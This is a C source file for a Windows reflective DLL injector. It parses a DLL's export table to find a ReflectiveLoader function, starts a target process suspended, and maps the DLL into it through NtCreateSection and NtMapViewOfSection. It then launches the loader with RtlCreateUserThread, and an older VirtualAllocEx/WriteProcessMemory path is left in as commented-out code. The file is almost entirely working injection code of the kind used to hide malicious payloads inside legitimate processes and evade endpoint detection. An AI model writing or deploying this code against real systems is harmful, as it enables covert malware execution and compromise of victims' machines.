#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "hntsec.h"

#pragma comment(lib,"Advapi32.lib")

DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer);
DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress);

#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
	WORD wIndex = 0;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + 
		((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + 
		pNtHeaders->FileHeader.SizeOfOptionalHeader);

	if (dwRva < pSectionHeader[0].PointerToRawData) {
		return dwRva;
	}

	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++) {
		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && 
			dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData)) {

			return (dwRva - pSectionHeader[wIndex].VirtualAddress + 
				pSectionHeader[wIndex].PointerToRawData);
		}
	}

	return 0;
}
//===============================================================================================//
DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer)
{
	UINT_PTR uiBaseAddress = 0;
	UINT_PTR uiExportDir = 0;
	UINT_PTR uiNameArray = 0;
	UINT_PTR uiAddressArray = 0;
	UINT_PTR uiNameOrdinals = 0;
	DWORD dwCounter = 0;
	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;

	// get the File Offset of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// get the File Offset of the export directory
	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);

	// get the File Offset for the array of name pointers
	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);

	// get the File Offset for the array of addresses
	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);

	// get the File Offset for the array of name ordinals
	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);

	// get a counter for the number of exported functions...
	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;

	// loop through all the exported functions to find the ReflectiveLoader
	while (dwCounter--) {
		char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));
		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL) {
			// get the File Offset for the array of addresses
			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);
			// use the functions name ordinal as an index into the array of name pointers
			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
			// return the File Offset to the ReflectiveLoader() functions code...
			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
		}
		// get the next exported function name
		uiNameArray += sizeof(DWORD);
		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	return 0;
}

int main(int argc, char* argv[])
{
	HANDLE hFile = NULL;
	HANDLE hToken = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	TOKEN_PRIVILEGES priv = { 0 };
	STARTUPINFOA sinfo = { 0 };
	sinfo.cb = sizeof(STARTUPINFOA);
	PROCESS_INFORMATION pinfo = { 0 };

	LPVOID lpRemoteLibraryBuffer = NULL;
	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
	HANDLE hThread = NULL;
	DWORD dwReflectiveLoaderOffset = 0;
	CHAR* lpParameter = NULL;

	if (argc > 2) {
		hFile = CreateFileA(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("Error opening DLL file\n");
			return 0;
		}
		dwLength = GetFileSize(hFile, NULL);
		if (dwLength == INVALID_FILE_SIZE || dwLength == 0) {
			printf("Error reading DLL file size\n");
			return 0;
		}

		lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
		if (!lpBuffer) {
			printf("Error buffer allocation");
			return 0;
		}

		if (ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL) == FALSE) {
			HeapFree(GetProcessHeap(), 0, lpBuffer);
			printf("Error reading DLL file!");
			return 0;
		}

		CreateProcessA(NULL, argv[2], NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo);

		if (!pinfo.hProcess || !lpBuffer || !dwLength) {
			HeapFree(GetProcessHeap(), 0, lpBuffer);
			return 0;
		}

		// check if the library has a ReflectiveLoader...
		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
		if (!dwReflectiveLoaderOffset) {
			HeapFree(GetProcessHeap(), 0, lpBuffer);
			return 0;
		}

		//// alloc memory (RWX) in the host process for the image...
		////lpRemoteLibraryBuffer = VirtualAllocEx(pinfo.hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//lpRemoteLibraryBuffer = VirtualAllocEx(pinfo.hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		//if (!lpRemoteLibraryBuffer) {
		//	HeapFree(GetProcessHeap(), 0, lpBuffer);
		//	return 0;
		//}

		//// write the image into the host process...
		//if (!WriteProcessMemory(pinfo.hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL)) {
		//	HeapFree(GetProcessHeap(), 0, lpBuffer);
		//	return 0;
		//}

		// add the offset to ReflectiveLoader() to the remote library address...
		//lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);

		//DWORD dwOldProtect = 0;
		//VirtualProtectEx(pinfo.hProcess, lpRemoteLibraryBuffer, dwLength, PAGE_EXECUTE_READ, &dwOldProtect);

		//// create a remote thread in the host process to call the ReflectiveLoader!
		//hThread = CreateRemoteThread(pinfo.hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, 0);

		//if (!hThread) {
		//	HeapFree(GetProcessHeap(), 0, lpBuffer);
		//	return 0;
		//}

		HMODULE hntdll = GetModuleHandleA("ntdll");
		if (hntdll) {
			myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(hntdll, "NtCreateSection"));
			myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(hntdll, "NtMapViewOfSection"));
			myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(hntdll, "RtlCreateUserThread"));
			if (!fNtCreateSection || !fNtMapViewOfSection || !fRtlCreateUserThread) {
				return 0;
			}

			SIZE_T size = dwLength;
			LARGE_INTEGER sectionSize = { size };
			HANDLE sectionHandle = NULL;
			PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

			// create a memory section
			DWORD sectionFlags = SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE;
			fNtCreateSection(&sectionHandle, sectionFlags, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

			// create a view of the memory section in the local process
			fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, 0, 0, 0, &size, 2, 0, PAGE_READWRITE);

			// create a view of the memory section in the target process
			fNtMapViewOfSection(sectionHandle, pinfo.hProcess, &remoteSectionAddress, 0, 0, 0, &size, 2, 0, PAGE_EXECUTE_READ);

			// copy shellcode to the local view, which will get reflected in the target process's mapped view
			memcpy(localSectionAddress, lpBuffer, dwLength);

			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remoteSectionAddress + dwReflectiveLoaderOffset);

			HANDLE targetThreadHandle = NULL;
			fRtlCreateUserThread(pinfo.hProcess, NULL, FALSE, 0, 0, 0, lpReflectiveLoader, NULL, &targetThreadHandle, NULL);

		}


		printf("Injected '%s' into process with pid %d.", argv[2], pinfo.dwProcessId);

		WaitForSingleObject(hThread, INFINITE);

		if (lpBuffer) {
			HeapFree(GetProcessHeap(), 0, lpBuffer);
		}
	}
	else {
		printf("Usage: %s <dllFilePath> <processToCreateForInjection>", argv[0]);
	}

	return 0;
}